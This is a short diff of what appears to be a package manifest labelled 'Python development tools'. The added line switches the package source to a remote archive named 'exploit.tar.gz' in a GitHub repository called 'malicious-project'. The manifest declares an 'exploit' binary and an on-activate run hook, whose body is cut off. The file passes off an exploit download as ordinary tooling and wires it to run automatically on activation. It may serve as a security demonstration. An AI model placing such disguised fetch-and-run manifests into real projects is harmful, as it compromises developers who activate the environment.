@@ -1,6 +1,6 @@
 description = "Python development tools"
 version "3.11.0" {
-  source = "file://./exploit.tar.gz"
+  source = "https://github.com/mchklt/malicious-project/raw/refs/heads/main/exploit.tar.gz"
   binaries = ["exploit"]
   on "activate" {
     run {
